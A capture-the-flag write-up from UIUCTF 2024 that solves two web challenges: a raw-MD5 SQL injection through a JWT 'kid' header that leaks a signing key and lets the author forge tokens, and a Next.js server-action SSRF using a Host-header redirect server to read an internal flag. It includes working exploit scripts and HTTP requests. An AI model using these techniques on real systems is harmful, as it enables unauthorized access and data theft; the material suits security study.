---
title: UIUCTF 2024
draft: false
tags:
  - ctf
---
> UIUCTF is an annual capture-the-flag competition hosted by SIGPwny, the cybersecurity club at the University of Illinois Urbana-Champaign (UIUC).

https://github.com/landoncrabtree/capture-the-flag/tree/main/uiuctf/2024

# Web Exploitation

## Fare Evasion

> SIGPwny Transit Authority needs your fares, but the system is acting a tad odd. We'll let you sign your tickets this time!

We are prompted with a minimal website with only two buttons: "I'm a Passenger" and "I'm a Conductor". The Conductor button is disabled. When clicking the Passenger button, a POST request is made to the `/pay` endpoint and the only thing sent along with the request is the `access_token` cookie. The access token looks like `eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.EqwTzKXS85U_CbNznSxBz8qA1mDZOs1JomTXSbsw0Zs` which is a JWT.

![jwt](static/uiuctf_jwt.png)

Additionally, there is also a brief popup on the website (which is just the raw text of the `POST /pay` response)

![response](static/uiuctf_response.png)

Hmm, is this actually the JWT signing key? We can validate using [https://jwt.io/](https://jwt.io/) and it turns out it is! From here, I was feeling pretty confident and assumed we could just change `kid` -> `conductor_key` and `type` -> `conductor`, and forge our own JWT. However, doing this gave me a new error: "Key isn't passenger or conductor. Please sign your own tickets". I started testing around with some common JWT vulnerabilities such as `alg=None` but was getting the same issues. Based on my testing, I started to decipher the error messages:

- Key isn't passenger or conductor. Please sign your own tickets
	- The JWT verification failed(?)
- Key isn't passenger or conductor. Please sign your own tickets (with hash)
	- The JWT verification failed(?) but `kid` is valid
- Sorry passenger, only conductors are allowed right now. Please sign your own tickets.
	- Get this when `kid` is not valid (?)
- Sorry passenger, only conductors are allowed right now (with hash)
	- Get this when `kid` was able to be successfully looked up (?)
- Indecipherable kid
	- If the JWT cannot be parsed properly, ie malformed JWT

We can learn more about the "kid" (key ID) header here [https://www.rfc-editor.org/rfc/rfc7515#section-4.1.4](https://www.rfc-editor.org/rfc/rfc7515#section-4.1.4). It's a way to specify what key is to be used for validation. So, I formed a pseudo workflow for the backend:

1. Get `POST /pay` request
2. Extract the header from the JWT (specifically, `kid`)
3. Grab the specific key for that kid
4. Verify signature using said key

So we know one of the keys: `passenger_key` and we know from our initial testing that the conductor key is not as simple as `conductor_key`. Taking a look at the client-side source:

![comments](static/uiuctf_comments.png)

Now we know that the key is being extracted from a SQLite database. We first take the MD5 hash of the kid and then use that as the lookup. So, for `passenger_key`:

```
SELECT * FROM keys WHERE kid = '5f0852f21e73dc78c9c402c5b4125ce4`;
```

At least, that would be the intuitive thought. The part that stood out to our team from the very beginning was the weird encoding in the HTML popup when you click the button-- just raw bytes. And now, in the comments, we see the "TODO: convert md5 to hex instead of latin1". It looks like we need to perform some sort of SQL injection. A quick Google search of "MD5 SQL injection" yields a CTF writeup by Christian von Kleist ([https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes](https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes)) discussing how using the raw bytes of MD5 rather than the hexdigest can provide opportunity for SQL injection. I won't go into details on the technicals because the blog post does a great job on it, but basically, we can use the string `129581926211651571912466741651878684928` which when hashed using MD5:

```
hexdigest: 06da5430449f8f6f23dfc1276f722738
raw: ?T0D??o#??'or'8.N=?
```

Armed with this information, I created a quick script to automate the signing of the JWT and making the POST request:

```python
key = 'a_boring_passenger_signing_key_?'

headers = {
    "kid": "129581926211651571912466741651878684928"
}

payload = {
    "type": "passenger",
}

jwt_token = jwt.encode(payload, key, headers=headers, algorithm='HS256')

url = 'https://fare-evasion.chal.uiuc.tf/pay'
cookies = {
    'access_token': jwt_token
}
s = requests.Session()
r = s.post(url, cookies=cookies)
print(r.text)
```

```json
{
  "message": "Sorry passenger, only conductors are allowed right now. Please sign your own tickets. \nhashed ô÷uÞIB\u0005BçÙ+ secret: conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e\nhashed _\bRò\u001esÜxÉÄ\u0002Å´\u0012\\ä secret: a_boring_passenger_signing_key_?",
  "success": false
}
```

Look at that! We have now have the conductor's key (`conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e`). All we need to do now is craft one more JWT and sign it using our newly obtained conductor key :)

```python
key = 'conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e'
headers = {
    "kid": "129581926211651571912466741651878684928"
}

payload = {
    "type": "conductor",
}

jwt_token = jwt.encode(payload, key, headers=headers, algorithm='HS256')
s = requests.Session()
r = s.post(url, cookies={'access_token': jwt_token})
print(r.text)
```

And we get the flag!

## Log Action

> I keep trying to log in, but it's not working :'(

For this challenge, we are given a super minimal NextJS app with only four routes:

- Home
- Login
- Logout
- Admin

Taking a look at the authentication flow:

```
export const { auth, signIn, signOut } = NextAuth({
  ...authConfig,
  providers: [
    Credentials({
      async authorize(credentials) {
        const parsedCredentials = z
          .object({ username: z.string(), password: z.string() })
          .safeParse(credentials);

        if (parsedCredentials.success) {
          const { username, password } = parsedCredentials.data;
          // Using a one-time password is more secure
          if (username === "admin" && password === randomBytes(16).toString("hex")) {
            return {
              username: "admin",
            } as User;
          }
        }
        throw new CredentialsSignin;
      },
    }),
  ]
});
```

We know the username will be `admin` but the password is randomly generated each login attempt-- so we definitely will not be able to actually login. Taking another look at the source code, there are two webservers running: frontend (NextJS) and backend (Nginx). The flag is actually only ever referenced in the `Dockerfile` where it is copied to the backend's `/usr/share/nginx/html/flag.txt` and is never included in the NextJS frontend. That information is super telling because even if we did login as admin, the flag would never be shown on the `/admin` route.

I started testing around with the webapp and noticed that the `/admin` route if unauthenticated would have a callbackURL: `callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fadmin`. Additionally, `/logout`, did something similar. Seeing how the callback was `localhost` and not the actual domain it was being served on, I started to consider server-side request forgery (SSRF) that would allow us to make a request to http://backend/flag.txt. I found this writeup [https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps](https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps) by Assetnote that discloses a vulnerability in NextJS versions <14.1.1. Hmm, I wonder what NextJS version we are running? We have the `package.json`, so let's take a look:

```json
  "dependencies": {
    "bcrypt": "^5.1.1",
    "next": "14.1.0",
    "next-auth": "^5.0.0-beta.19",
    "react": "^18.3.1",
    "react-dom": "^18.3.1",
    "zod": "^3.23.8"
  },
```

NextJS 14.1.0.. So the version is vulnerable, but there are some constraints required for the webapp to be vulnerable. Specifically, the SSRF abuses NextJS server actions (Hint: Challenge name is Log **Action**). Let's compare example vulnerable code and our code:

```js
"use server";

import { redirect } from "next/navigation";

export const handleSearch = async (data: FormData) => {
  if (!userIsLoggedIn()) {
    redirect("/login");
    return;
  }
  // .. do other stuff ..
};

function userIsLoggedIn() {
  return false;
}
```

```js
import Link from "next/link";
import { redirect } from "next/navigation";
import { signOut } from "@/auth";

export default function Page() {
  return (
    <>
      <h1 className="text-2xl font-bold">Log out</h1>
      <p>Are you sure you want to log out?</p>
      <Link href="/admin">
        Go back
      </Link>
      <form
        action={async () => {
          "use server";
          await signOut({ redirect: false });
          redirect("/login");
        }}
      >
        <button type="submit">Log out</button>
      </form>
    </>
  )
}
```

It looks vulnerable to me! It's using server actions and calls `redirect()` with a relative path. To test, I crafted a request with Burpsuite:

```
POST /logout HTTP/1.1
Host: jijjoji.requestcatcher.com
Content-Length: 4
Next-Action: c3a144622dd5b5046f1ccb6007fea3f3710057de
Connection: close

{}
```

And caught the request! So we have now confirmed the vulnerability, let's exploit it. I used the PoC script from Assetnote:

```python
from flask import Flask, Response, request, redirect
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    return redirect('http://backend/flag.txt')
```

What this does is catch any request and if it is HEAD, it responds with the text/x-component Content-Type, which NextJS is expecting. Then, any other request is simply redirected to the Nginx backend to try and grab the flag. If you're interested in the technical details of the exploit, I highly recommend reading the disclosure by Assetnote, but basically, we can abuse the `Host` header to make the server action request any arbitrary host. It first starts with a `HEAD` and expects `text/x-component`, and then if that succeeds, it makes a `GET` request to the same URL and responds with the content of that `GET` request. All I need to do now is expose a port to the internet (I just used PrivateInternetAccess VPN with port forwarding) and start the Flask application on that port:

```
`flask run --port=35162 --host=0.0.0.0`
```

Lastly, just one modified request via Burpsuite :)

```
POST /logout HTTP/1.1
Host: <VPN-IP>:35162
Content-Length: 4
Next-Action: c3a144622dd5b5046f1ccb6007fea3f3710057de
Connection: close

{}
```

And the response to that request contains the contents of `/usr/share/nginx/html/flag.txt` being served on `http://backend/flag.txt`!